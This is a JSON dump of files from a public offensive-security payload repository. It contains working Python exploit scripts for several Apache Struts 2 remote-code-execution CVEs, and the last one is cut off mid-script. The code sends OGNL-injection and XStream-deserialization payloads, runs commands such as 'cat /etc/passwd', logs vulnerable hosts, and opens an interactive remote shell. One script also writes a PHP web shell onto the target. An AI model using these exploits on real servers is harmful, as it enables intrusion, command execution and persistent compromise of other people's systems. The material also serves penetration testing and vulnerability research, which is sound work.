{
  "repo_name": "swisskyrepo/PayloadsAllTheThings",
  "repo_url": "https://github.com/swisskyrepo/PayloadsAllTheThings",
  "description": "A list of useful payloads and bypass for Web Application Security and Pentest/CTF",
  "stars": 63979,
  "language": "Python",
  "created_at": "2016-10-18T07:29:07Z",
  "updated_at": "2025-03-19T05:06:23Z",
  "files": {
    "CVE Exploits/Apache Struts 2 CVE-2013-2251 CVE-2017-5638 CVE-2018-11776_.py": "#!/usr/bin/python\n\nfrom __future__ import print_function\nfrom future import standard_library\nstandard_library.install_aliases()\nfrom builtins import input\nfrom builtins import str\nimport urllib.request, urllib.error, urllib.parse\nimport time\nimport sys\nimport os\nimport subprocess\nimport requests\nimport readline\nimport urllib.parse\n\nRED = '\\033[1;31m'\nBLUE = '\\033[94m'\nBOLD = '\\033[1m'\nGREEN = '\\033[32m'\nOTRO = '\\033[36m'\nYELLOW = '\\033[33m'\nENDC = '\\033[0m'\n\ndef cls():\n    os.system(['clear', 'cls'][os.name == 'nt'])\ncls()\n\nlogo = BLUE+'''\n  ___   _____  ___    _   _  _____  ___\n (  _`\\(_   _)|  _`\\ ( ) ( )(_   _)(  _`\\\n | (_(_) | |  | (_) )| | | |  | |  | (_(_)\n `\\__ \\  | |  | ,  / | | | |  | |  `\\__ \\\n ( )_) | | |  | |\\ \\ | (_) |  | |  ( )_) |\n `\\____) (_)  (_) (_)(_____)  (_)  `\\____)\n\n        =[ Command Execution v3]=\n              By @s1kr10s\n'''+ENDC\nprint(logo)\n\nprint(\" * Ejemplo: http(s)://www.victima.com/files.login\\n\")\nhost = input(BOLD+\" [+] HOST: \"+ENDC)\n\nif len(host) > 0:\n    if host.find(\"https://\") != -1 or host.find(\"http://\") != -1:\n\n        poc = \"?redirect:${%23w%3d%23context.get%28%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27%29.getWriter%28%29,%23w.println%28%27mamalo%27%29,%23w.flush%28%29,%23w.close%28%29}\"\n\n        def exploit(comando):\n            exploit = \"?redirect:${%23a%3d%28new%20java.lang.ProcessBuilder%28new%20java.lang.String[]{\"+comando+\"}%29%29.start%28%29,%23b%3d%23a.getInputStream%28%29,%23c%3dnew%20java.io.InputStreamReader%28%23b%29,%23d%3dnew%20java.io.BufferedReader%28%23c%29,%23e%3dnew%20char[50000],%23d.read%28%23e%29,%23matt%3d%23context.get%28%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27%29,%23matt.getWriter%28%29.println%28%23e%29,%23matt.getWriter%28%29.flush%28%29,%23matt.getWriter%28%29.close%28%29}\"\n            return exploit\n\n        def exploit2(comando):\n            exploit2 = \"Content-Type:%{(+++#_='multipart/form-data').(+++#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(+++#_memberAccess?(+++#_memberAccess=#dm):((+++#container=#context['com.opensymphony.xwork2.ActionContext.container']).(+++#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(+++#ognlUtil.getExcludedPackageNames().clear()).(+++#ognlUtil.getExcludedClasses().clear()).(+++#context.setMemberAccess(+++#dm)))).(+++#shell='\"+str(comando)+\"').(+++#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(+++#shells=(+++#iswin?{'cmd.exe','/c',#shell}:{'/bin/sh','-c',#shell})).(+++#p=new java.lang.ProcessBuilder(+++#shells)).(+++#p.redirectErrorStream(true)).(+++#process=#p.start()).(+++#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(+++#process.getInputStream(),#ros)).(+++#ros.flush())}\"\n            return exploit2\n\n        def exploit3(comando):\n            exploit3 = \"%24%7B%28%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23a%3D@java.lang.Runtime@getRuntime%28%29.exec%28%27\"+comando+\"%27%29.getInputStream%28%29%2C%23b%3Dnew%20java.io.InputStreamReader%28%23a%29%2C%23c%3Dnew%20%20java.io.BufferedReader%28%23b%29%2C%23d%3Dnew%20char%5B51020%5D%2C%23c.read%28%23d%29%2C%23sbtest%3D@org.apache.struts2.ServletActionContext@getResponse%28%29.getWriter%28%29%2C%23sbtest.println%28%23d%29%2C%23sbtest.close%28%29%29%7D\"\n            return exploit3\n\n        def pwnd(shellfile):\n            exploitfile = \"?redirect:${%23a%3d%28new%20java.lang.ProcessBuilder%28new%20java.lang.String[]{\"+shellfile+\"}%29%29.start%28%29,%23b%3d%23a.getInputStream%28%29,%23c%3dnew%20java.io.InputStreamReader%28%23b%29,%23d%3dnew%20java.io.BufferedReader%28%23c%29,%23e%3dnew%20char[50000],%23d.read%28%23e%29,%23matt%3d%23context.get%28%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27%29,%23matt.getWriter%28%29.println%28%23e%29,%23matt.getWriter%28%29.flush%28%29,%23matt.getWriter%28%29.close%28%29}\"\n            return exploitfile\n\n        def validador():\n            arr_lin_win = [\"file%20/etc/passwd\",\"dir\",\"net%20users\",\"id\",\"/sbin/ifconfig\",\"cat%20/etc/passwd\"]\n            return arr_lin_win\n\n        #def reversepl(ip,port):\n        #       print \"perl\"\n\n        #def reversepy(ip,port):\n        #       print \"python\"\n\n        # CVE-2013-2251 ---------------------------------------------------------------------------------\n        try:\n            response = ''\n            response = urllib.request.urlopen(host+poc)\n        except:\n            print(RED+\" Servidor no responde\\n\"+ENDC)\n            exit(0)\n\n        print(BOLD+\"\\n [+] EJECUTANDO EXPLOIT CVE-2013-2251\"+ENDC)\n\n        if response.read().find(\"mamalo\") != -1:\n            print(RED+\"   [-] VULNERABLE\"+ENDC)\n            owned = open('vulnsite.txt', 'a')\n            owned.write(str(host)+'\\n')\n            owned.close()\n\n            opcion = input(YELLOW+\"   [-] RUN THIS EXPLOIT (s/n): \"+ENDC)\n            #print BOLD+\"   * [SHELL REVERSA]\"+ENDC\n            #print OTRO+\"     Struts@Shell:$ reverse 127.0.0.1 4444 (perl,python,bash)\\n\"+ENDC\n            if opcion == 's':\n                print(YELLOW+\"   [-] GET PROMPT...\\n\"+ENDC)\n                time.sleep(1)\n                print(BOLD+\"   * [UPLOAD SHELL]\"+ENDC)\n                print(OTRO+\"     Struts@Shell:$ pwnd (php)\\n\"+ENDC)\n\n                while 1:\n                    separador = input(GREEN+\"Struts2@Shell_1:$ \"+ENDC)\n                    espacio = separador.split(' ')\n                    comando = \"','\".join(espacio)\n\n                    if espacio[0] != 'reverse' and espacio[0] != 'pwnd':\n                        shell = urllib.request.urlopen(host+exploit(\"'\"+str(comando)+\"'\"))\n                        print(\"\\n\"+shell.read())\n                    elif espacio[0] == 'pwnd':\n                        pathsave=input(\"path EJ:/tmp/: \")\n\n                        if espacio[1] == 'php':\n                            shellfile = \"\"\"'python','-c','f%3dopen(\"/tmp/status.php\",\"w\");f.write(\"<?php%20system($_GET[ksujenenuhw])?>\")'\"\"\"\n                            urllib.request.urlopen(host+pwnd(str(shellfile)))\n                            shell = urllib.request.urlopen(host+exploit(\"'ls','-l','\"+pathsave+\"status.php'\"))\n                            if shell.read().find(pathsave+\"status.php\") != -1:\n                                print(BOLD+GREEN+\"\\nCreate File Successful :) [\"+pathsave+\"status.php]\\n\"+ENDC)\n                            else:\n                                print(BOLD+RED+\"\\nNo Create File :/\\n\"+ENDC)\n\n        # CVE-2017-5638 ---------------------------------------------------------------------------------\n        print(BLUE+\"     [-] NO VULNERABLE\"+ENDC)\n        print(BOLD+\" [+] EJECUTANDO EXPLOIT CVE-2017-5638\"+ENDC)\n        x = 0\n        while x < len(validador()):\n            valida = validador()[x]\n\n            try:\n                req = urllib.request.Request(host, None, {'User-Agent': 'Mozilla/5.0', 'Content-Type': exploit2(str(valida))})\n                result = urllib.request.urlopen(req).read()\n\n                if result.find(\"ASCII\") != -1 or result.find(\"No such\") != -1 or result.find(\"Directory of\") != -1 or result.find(\"Volume Serial\") != -1 or result.find(\"inet\") != -1 or result.find(\"root:\") != -1 or result.find(\"uid=\") != -1 or result.find(\"accounts\") != -1 or result.find(\"Cuentas\") != -1:\n                    print(RED+\"   [-] VULNERABLE\"+ENDC)\n                    owned = open('vulnsite.txt', 'a')\n                    owned.write(str(host)+'\\n')\n                    owned.close()\n\n                    opcion = input(YELLOW+\"   [-] RUN THIS EXPLOIT (s/n): \"+ENDC)\n                    if opcion == 's':\n                        print(YELLOW+\"   [-] GET PROMPT...\\n\"+ENDC)\n                        time.sleep(1)\n\n                        while 1:\n                            try:\n                                separador = input(GREEN+\"\\nStruts2@Shell_2:$ \"+ENDC)\n                                req = urllib.request.Request(host, None, {'User-Agent': 'Mozilla/5.0', 'Content-Type': exploit2(str(separador))})\n                                result = urllib.request.urlopen(req).read()\n                                print(\"\\n\"+result)\n                            except:\n                                exit(0)\n                    else:\n                        x = len(validador())\n                else:\n                    print(BLUE+\"     [-] NO VULNERABLE \"+ENDC + \"Payload: \" + str(x))\n            except:\n                pass\n            x=x+1\n\n        # CVE-2018-11776 ---------------------------------------------------------------------------------\n        print(BLUE+\"     [-] NO VULNERABLE\"+ENDC)\n        print(BOLD+\" [+] EJECUTANDO EXPLOIT CVE-2018-11776\"+ENDC)\n        x = 0\n        while x < len(validador()):\n            #Filtramos la url solo dominio\n            url = host.replace('#', '%23')\n            url = host.replace(' ', '%20')\n            if ('://' not in url):\n                url = str(\"http://\") + str(url)\n            scheme = urllib.parse.urlparse(url).scheme\n            site = scheme + '://' + urllib.parse.urlparse(url).netloc\n\n            #Filtramos la url solo path\n            file_path = urllib.parse.urlparse(url).path\n            if (file_path == ''):\n                file_path = '/'\n\n            valida = validador()[x]\n            try:\n                result = requests.get(site+\"/\"+exploit3(str(valida))+file_path).text\n\n                if result.find(\"ASCII\") != -1 or result.find(\"No such\") != -1 or result.find(\"Directory of\") != -1 or result.find(\"Volume Serial\") != -1 or result.find(\"inet\") != -1 or result.find(\"root:\") != -1 or result.find(\"uid=\") != -1 or result.find(\"accounts\") != -1 or result.find(\"Cuentas\") != -1:\n                    print(RED+\"   [-] VULNERABLE\"+ENDC)\n                    owned = open('vulnsite.txt', 'a')\n                    owned.write(str(host)+'\\n')\n                    owned.close()\n\n                    opcion = input(YELLOW+\"   [-] RUN THIS EXPLOIT (s/n): \"+ENDC)\n                    if opcion == 's':\n                        print(YELLOW+\"   [-] GET PROMPT...\\n\"+ENDC)\n                        time.sleep(1)\n                        print(BOLD+\"   * [UPLOAD SHELL]\"+ENDC)\n                        print(OTRO+\"     Struts@Shell:$ pwnd (php)\\n\"+ENDC)\n\n                        while 1:\n                            separador = input(GREEN+\"Struts2@Shell_3:$ \"+ENDC)\n                            espacio = separador.split(' ')\n                            comando = \"%20\".join(espacio)\n\n                            shell = urllib.request.urlopen(host+exploit3(str(comando)))\n                            print(\"\\n\"+shell.read())\n\n                    else:\n                        x = len(validador())\n                        exit(0)\n                else:\n                    print(BLUE+\"     [-] NO VULNERABLE \"+ENDC + \"Payload: \" + str(x))\n            except:\n                pass\n            x=x+1\n    else:\n        print(RED+\" Debe introducir el protocolo (https o http) para el dominio\\n\"+ENDC)\n        exit(0)\nelse:\n    print(RED+\" Debe Ingresar una Url\\n\"+ENDC)\n    exit(0)\n",
    "CVE Exploits/Apache Struts 2 CVE-2017-9805.py": "#!/usr/bin/env python3\n# coding=utf-8\n# *****************************************************\n# struts-pwn: Apache Struts CVE-2017-9805 Exploit\n# Author:\n# Mazin Ahmed <Mazin AT MazinAhmed DOT net>\n# This code is based on:\n# https://github.com/rapid7/metasploit-framework/pull/8924\n# https://techblog.mediaservice.net/2017/09/detection-payload-for-the-new-struts-rest-vulnerability-cve-2017-9805/\n# *****************************************************\nfrom __future__ import print_function\nfrom builtins import str\nimport argparse\nimport requests\nimport sys\n\n# Disable SSL warnings\ntry:\n    import requests.packages.urllib3\n    requests.packages.urllib3.disable_warnings()\nexcept Exception:\n    pass\n\nif len(sys.argv) <= 1:\n    print('[*] CVE: 2017-9805 - Apache Struts2 S2-052')\n    print('[*] Struts-PWN - @mazen160')\n    print('\\n%s -h for help.' % (sys.argv[0]))\n    exit(0)\n\nparser = argparse.ArgumentParser()\nparser.add_argument(\"-u\", \"--url\",\n                    dest=\"url\",\n                    help=\"Check a single URL.\",\n                    action='store')\nparser.add_argument(\"-l\", \"--list\",\n                    dest=\"usedlist\",\n                    help=\"Check a list of URLs.\",\n                    action='store')\nparser.add_argument(\"-c\", \"--cmd\",\n                    dest=\"cmd\",\n                    help=\"Command to execute. (Default: 'echo test > /tmp/struts-pwn')\",\n                    action='store',\n                    default='echo test > /tmp/struts-pwn')\nparser.add_argument(\"--exploit\",\n                    dest=\"do_exploit\",\n                    help=\"Exploit.\",\n                    action='store_true')\nargs = parser.parse_args()\nurl = args.url if args.url else None\nusedlist = args.usedlist if args.usedlist else None\nurl = args.url if args.url else None\ncmd = args.cmd if args.cmd else None\ndo_exploit = args.do_exploit if args.do_exploit else None\n\n\ndef url_prepare(url):\n    url = url.replace('#', '%23')\n    url = url.replace(' ', '%20')\n    if ('://' not in url):\n        url = str('http') + str('://') + str(url)\n    return(url)\n\n\ndef exploit(url, cmd, dont_print_status_on_console=False):\n    url = url_prepare(url)\n    if dont_print_status_on_console is False:\n        print('\\n[*] URL: %s' % (url))\n        print('[*] CMD: %s' % (cmd))\n    cmd = \"\".join([\"<string>{0}</string>\".format(_) for _ in cmd.split(\" \")])\n\n    payload = \"\"\"\n<map>\n  <entry>\n    <jdk.nashorn.internal.objects.NativeString>\n      <flags>0</flags>\n      <value class=\"com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data\">\n        <dataHandler>\n          <dataSource class=\"com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource\">\n            <is class=\"javax.crypto.CipherInputStream\">\n              <cipher class=\"javax.crypto.NullCipher\">\n                <initialized>false</initialized>\n                <opmode>0</opmode>\n                <serviceIterator class=\"javax.imageio.spi.FilterIterator\">\n                  <iter class=\"javax.imageio.spi.FilterIterator\">\n                    <iter class=\"java.util.Collections$EmptyIterator\"/>\n                    <next class=\"java.lang.ProcessBuilder\">\n                      <command>\n                        {0}\n                      </command>\n                      <redirectErrorStream>false</redirectErrorStream>\n                    </next>\n                  </iter>\n                  <filter class=\"javax.imageio.ImageIO$ContainsFilter\">\n                    <method>\n                      <class>java.lang.ProcessBuilder</class>\n                      <name>start</name>\n                      <parameter-types/>\n                    </method>\n                    <name>foo</name>\n                  </filter>\n                  <next class=\"string\">foo</next>\n                </serviceIterator>\n                <lock/>\n              </cipher>\n              <input class=\"java.lang.ProcessBuilder$NullInputStream\"/>\n              <ibuffer/>\n              <done>false</done>\n              <ostart>0</ostart>\n              <ofinish>0</ofinish>\n              <closed>false</closed>\n            </is>\n            <consumed>false</consumed>\n          </dataSource>\n          <transferFlavors/>\n        </dataHandler>\n        <dataLen>0</dataLen>\n      </value>\n    </jdk.nashorn.internal.objects.NativeString>\n    <jdk.nashorn.internal.objects.NativeString reference=\"../jdk.nashorn.internal.objects.NativeString\"/>\n  </entry>\n  <entry>\n    <jdk.nashorn.internal.objects.NativeString reference=\"../../entry/jdk.nashorn.internal.objects.NativeString\"/>\n    <jdk.nashorn.internal.objects.NativeString reference=\"../../entry/jdk.nashorn.internal.objects.NativeString\"/>\n  </entry>\n</map>\n\"\"\".format(cmd)\n\n    headers = {\n        'User-Agent': 'struts-pwn (https://github.com/mazen160/struts-pwn_CVE-2017-9805)',\n        # 'User-Agent': 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36',\n        'Referer': str(url),\n        'Content-Type': 'application/xml',\n        'Accept': '*/*'\n    }\n\n    timeout = 3\n    try:\n        output = requests.post(url, data=payload, headers=headers, verify=False, timeout=timeout, allow_redirects=False).text\n    except Exception as e:\n        print(\"EXCEPTION::::--> \" + str(e))\n        output = 'ERROR'\n    return(output)\n\n\ndef check(url):\n    url = url_prepare(url)\n    print('\\n[*] URL: %s' % (url))\n\n    initial_request = exploit(url, \"\", dont_print_status_on_console=True)\n    if initial_request == \"ERROR\":\n        result = False\n        print(\"The host does not respond as expected.\")\n        return(result)\n\n    payload_sleep_based_10seconds = \"\"\"\n<map>\n  <entry>\n    <jdk.nashorn.internal.objects.NativeString>\n      <flags>0</flags>\n      <value class=\"com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data\">\n        <dataHandler>\n          <dataSource class=\"com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource\">\n            <is class=\"javax.crypto.CipherInputStream\">\n              <cipher class=\"javax.crypto.NullCipher\">\n                <initialized>false</initialized>\n                <opmode>0</opmode>\n                <serviceIterator class=\"javax.imageio.spi.FilterIterator\">\n                  <iter class=\"javax.imageio.spi.FilterIterator\">\n                    <iter class=\"java.util.Collections$EmptyIterator\"/>\n                    <next class=\"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\" serialization=\"custom\">\n                      <com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl>\n                        <default>\n                          <__name>Pwnr</__name>\n                          <__bytecodes>\n                            <byte-array>yv66vgAAADIAMwoAAwAiBwAxBwAlBwAmAQAQc2VyaWFsVmVyc2lvblVJRAEAAUoBAA1Db25zdGFu\ndFZhbHVlBa0gk/OR3e8+AQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEA\nEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBABNTdHViVHJhbnNsZXRQYXlsb2FkAQAMSW5uZXJD\nbGFzc2VzAQA1THlzb3NlcmlhbC9wYXlsb2Fkcy91dGlsL0dhZGdldHMkU3R1YlRyYW5zbGV0UGF5\nbG9hZDsBAAl0cmFuc2Zvcm0BAHIoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94\nc2x0Yy9ET007W0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2Vy\naWFsaXphdGlvbkhhbmRsZXI7KVYBAAhkb2N1bWVudAEALUxjb20vc3VuL29yZy9hcGFjaGUveGFs\nYW4vaW50ZXJuYWwveHNsdGMvRE9NOwEACGhhbmRsZXJzAQBCW0xjb20vc3VuL29yZy9hcGFjaGUv\neG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQAKRXhjZXB0aW9u\ncwcAJwEApihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtMY29t\nL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yO0xjb20vc3Vu\nL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7\nKVYBAAhpdGVyYXRvcgEANUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1B\neGlzSXRlcmF0b3I7AQAHaGFuZGxlcgEAQUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFs\nL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQAKU291cmNlRmlsZQEADEdhZGdldHMu\namF2YQwACgALBwAoAQAzeXNvc2VyaWFsL3BheWxvYWRzL3V0aWwvR2FkZ2V0cyRTdHViVHJhbnNs\nZXRQYXlsb2FkAQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRp\nbWUvQWJzdHJhY3RUcmFuc2xldAEAFGphdmEvaW8vU2VyaWFsaXphYmxlAQA5Y29tL3N1bi9vcmcv\nYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQAfeXNvc2VyaWFs\nL3BheWxvYWRzL3V0aWwvR2FkZ2V0cwEACDxjbGluaXQ+AQAQamF2YS9sYW5nL1RocmVhZAcAKgEA\nBXNsZWVwAQAEKEopVgwALAAtCgArAC4BAA1TdGFja01hcFRhYmxlAQAeeXNvc2VyaWFsL1B3bmVy\nMTY3MTMxNTc4NjQ1ODk0AQAgTHlzb3NlcmlhbC9Qd25lcjE2NzEzMTU3ODY0NTg5NDsAIQACAAMA\nAQAEAAEAGgAFAAYAAQAHAAAAAgAIAAQAAQAKAAsAAQAMAAAALwABAAEAAAAFKrcAAbEAAAACAA0A\nAAAGAAEAAAAuAA4AAAAMAAEAAAAFAA8AMgAAAAEAEwAUAAIADAAAAD8AAAADAAAAAbEAAAACAA0A\nAAAGAAEAAAAzAA4AAAAgAAMAAAABAA8AMgAAAAAAAQAVABYAAQAAAAEAFwAYAAIAGQAAAAQAAQAa\nAAEAEwAbAAIADAAAAEkAAAAEAAAAAbEAAAACAA0AAAAGAAEAAAA3AA4AAAAqAAQAAAABAA8AMgAA\nAAAAAQAVABYAAQAAAAEAHAAdAAIAAAABAB4AHwADABkAAAAEAAEAGgAIACkACwABAAwAAAAiAAMA\nAgAAAA2nAAMBTBEnEIW4AC+xAAAAAQAwAAAAAwABAwACACAAAAACACEAEQAAAAoAAQACACMAEAAJ\n</byte-array>\n                            <byte-array>yv66vgAAADIAGwoAAwAVBwAXBwAYBwAZAQAQc2VyaWFsVmVyc2lvblVJRAEAAUoBAA1Db25zdGFu\ndFZhbHVlBXHmae48bUcYAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEA\nEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAANGb28BAAxJbm5lckNsYXNzZXMBACVMeXNvc2Vy\naWFsL3BheWxvYWRzL3V0aWwvR2FkZ2V0cyRGb287AQAKU291cmNlRmlsZQEADEdhZGdldHMuamF2\nYQwACgALBwAaAQAjeXNvc2VyaWFsL3BheWxvYWRzL3V0aWwvR2FkZ2V0cyRGb28BABBqYXZhL2xh\nbmcvT2JqZWN0AQAUamF2YS9pby9TZXJpYWxpemFibGUBAB95c29zZXJpYWwvcGF5bG9hZHMvdXRp\nbC9HYWRnZXRzACEAAgADAAEABAABABoABQAGAAEABwAAAAIACAABAAEACgALAAEADAAAAC8AAQAB\nAAAABSq3AAGxAAAAAgANAAAABgABAAAAOwAOAAAADAABAAAABQAPABIAAAACABMAAAACABQAEQAA\nAAoAAQACABYAEAAJ</byte-array>\n                          </__bytecodes>\n                          <__transletIndex>-1</__transletIndex>\n                          <__indentNumber>0</__indentNumber>\n                        </default>\n                        <boolean>false</boolean>\n                      </com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl>\n                    </next>\n                  </iter>\n                  <filter class=\"javax.imageio.ImageIO$ContainsFilter\">\n                    <method>\n                      <class>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</class>\n                      <name>newTransformer</name>\n                      <parameter-types/>\n                    </method>\n                    <name>foo</name>\n                  </filter>\n                  <next class=\"string\">foo</next>\n                </serviceIterator>\n                <lock/>\n              </cipher>\n              <input class=\"java.lang.ProcessBuilder$NullInputStream\"/>\n              <ibuffer/>\n              <done>false</done>\n              <ostart>0</ostart>\n              <ofinish>0</ofinish>\n              <closed>false</closed>\n            </is>\n            <consumed>false</consumed>\n          </dataSource>\n          <transferFlavors/>\n        </dataHandler>\n        <dataLen>0</dataLen>\n      </value>\n    </jdk.nashorn.internal.objects.NativeString>\n    <jdk.nashorn.internal.objects.NativeString reference=\"../jdk.nashorn.internal.objects.NativeString\"/>\n  </entry>\n  <entry>\n    <jdk.nashorn.internal.objects.NativeString reference=\"../../entry/jdk.nashorn.internal.objects.NativeString\"/>\n    <jdk.nashorn.internal.objects.NativeString reference=\"../../entry/jdk.nashorn.internal.objects.NativeString\"/>\n  </entry>\n</map>\n\"\"\"\n    headers = {\n        'User-Agent': 'struts-pwn (https://github.com/mazen160/struts-pwn_CVE-2017-9805)',\n        # 'User-Agent': 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36',\n        'Referer': str(url),\n        'Content-Type': 'application/xml',\n        'Accept': '*/*'\n    }\n\n    timeout = 8\n    try:\n        requests.post(url, data=payload_sleep_based_10seconds, headers=headers, verify=False, timeout=timeout, allow_redirects=False)\n        # if the response returned before the request timeout.\n        # then, the host should not be vulnerable.\n        # The request should return > 10 seconds, while the timeout is 8.\n        result = False\n    except Exception:\n        result = True\n    return(result)\n\n\ndef main(url=url, usedlist=usedlist, cmd=cmd, do_exploit=do_exploit):\n    if url:\n        if not do_exploit:\n            result = check(url)\n            output = '[*] Status: '\n            if result is True:\n                output += 'Vulnerable!'\n            else:\n                output += 'Not Affected.'\n            print(output)\n        else:\n            exploit(url, cmd)\n            print(\"[$] Request sent.\")\n            print(\"[.] If the host is vulnerable, the command will be executed in the background.\")\n\n    if usedlist:\n        URLs_List = []\n        try:\n            f_file = open(str(usedlist), 'r')\n            URLs_List = f_file.read().replace('\\r', '').split('\\n')\n            try:\n                URLs_List.remove('')\n            except ValueError:\n                pass\n            f_file.close()\n        except Exception as e:\n            print('Error: There was an error in reading list file.')\n            print(\"Exception: \" + str(e))\n            exit(1)\n        for url in URLs_List:\n            if not do_exploit:\n                result = check(url)\n                output = '[*] Status: '\n                if result is True:\n                    output += 'Vulnerable!'\n                else:\n                    output += 'Not Affected.'\n                print(output)\n            else:\n                exploit(url, cmd)\n                print(\"[$] Request sent.\")\n                print(\"[.] If the host is vulnerable, the command will be executed in the background.\")\n\n    print('[%] Done.')\n\nif __name__ == '__main__':\n    try:\n        main(url=url, usedlist=usedlist, cmd=cmd, do_exploit=do_exploit)\n    except KeyboardInterrupt:\n        print('\\nKeyboardInterrupt Detected.')\n        print('Exiting...')\n        exit(0)\n",
    "CVE Exploits/Apache Struts 2 CVE-2018-11776.py": "#!/usr/bin/env python3\n# coding=utf-8\n# *****************************************************\n# struts-pwn: Apache Struts CVE-2018-11776 Exploit\n# Author:\n# Mazin Ahmed <Mazin AT MazinAhmed DOT net>\n# This code uses a payload from:\n# https://github.com/jas502n/St2-057\n# *****************************************************\n\nfrom __future__ import print_function\nfrom future import standard_library\nstandard_library.install_aliases()\nfrom builtins import str\nfrom builtins import range\nimport argparse\nimport random\nimport requests\nimport sys\ntry:\n    from urllib import parse as urlparse\nexcept ImportError:\n    import urllib.parse\n\n# Disable SSL warnings\ntry:\n    import requests.packages.urllib3\n    requests.packages.urllib3.disable_warnings()\nexcept Exception:\n    pass\n\nif len(sys.argv) <= 1:\n    print('[*] CVE: 2018-11776 - Apache Struts2 S2-057')\n    print('[*] Struts-PWN - @mazen160')\n    print('\\n%s -h for help.' % (sys.argv[0]))\n    exit(0)\n\n\nparser = argparse.ArgumentParser()\nparser.add_argument(\"-u\", \"--url\",\n                    dest=\"url\",\n                    help=\"Check a single URL.\",\n                    action='store')\nparser.add_argument(\"-l\", \"--list\",\n                    dest=\"usedlist\",\n                    help=\"Check a list of URLs.\",\n                    action='store')\nparser.add_argument(\"-c\", \"--cmd\",\n                    dest=\"cmd\",\n                    help=\"Command to execute. (Default: 'id')\",\n                    action='store',\n                    default='id')\nparser.add_argument(\"--exploit\",\n                    dest=\"do_exploit\",\n                    help=\"Exploit.\",\n                    action='store_true')\n\n\nargs = parser.parse_args()\nurl = args.url if args.url else None\nusedlist = args.usedlist if args.usedlist else None\ncmd = args.cmd if args.cmd else None\ndo_exploit = args.do_exploit if args.do_exploit else None\n\nheaders = {\n    'User-Agent': 'struts-pwn (https://github.com/mazen160/struts-pwn_CVE-2018-11776)',\n    # 'User-Agent': 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36',\n    'Accept': '*/*'\n}\ntimeout = 3\n\n\ndef parse_url(url):\n    \"\"\"\n    Parses the URL.\n    \"\"\"\n\n    # url: http://example.com/demo/struts2-showcase/index.action\n\n    url = url.replace('#', '%23')\n    url = url.replace(' ', '%20')\n\n    if ('://' not in url):\n        url = str(\"http://\") + str(url)\n    scheme = urllib.parse.urlparse(url).scheme\n\n    # Site: http://example.com\n    site = scheme + '://' + urllib.parse.urlparse(url).netloc\n\n    # FilePath: /demo/struts2-showcase/index.action\n    file_path = urllib.parse.urlparse(url).path\n    if (file_path == ''):\n        file_path = '/'\n\n    # Filename: index.action\n    try:\n        filename = url.split('/')[-1]\n    except IndexError:\n        filename = ''\n\n    # File Dir: /demo/struts2-showcase/\n    file_dir = file_path.rstrip(filename)\n    if (file_dir == ''):\n        file_dir = '/'\n\n    return({\"site\": site,\n            \"file_dir\": file_dir,\n            \"filename\": filename})\n\n\ndef build_injection_inputs(url):\n    \"\"\"\n    Builds injection inputs for the check.\n    \"\"\"\n\n    parsed_url = parse_url(url)\n    injection_inputs = []\n    url_directories = parsed_url[\"file_dir\"].split(\"/\")\n\n    try:\n        url_directories.remove(\"\")\n    except ValueError:\n        pass\n\n    for i in range(len(url_directories)):\n        injection_entry = \"/\".join(url_directories[:i])\n\n        if not injection_entry.startswith(\"/\"):\n            injection_entry = \"/%s\" % (injection_entry)\n\n        if not injection_entry.endswith(\"/\"):\n            injection_entry = \"%s/\" % (injection_entry)\n\n        injection_entry += \"{{INJECTION_POINT}}/\"  # It will be renderred later with the payload.\n        injection_entry += parsed_url[\"filename\"]\n\n        injection_inputs.append(injection_entry)\n\n    return(injection_inputs)\n\n\ndef check(url):\n    random_value = int(''.join(random.choice('0123456789') for i in range(2)))\n    multiplication_value = random_value * random_value\n    injection_points = build_injection_inputs(url)\n    parsed_url = parse_url(url)\n    print(\"[%] Checking for CVE-2018-11776\")\n    print(\"[*] URL: %s\" % (url))\n    print(\"[*] Total of 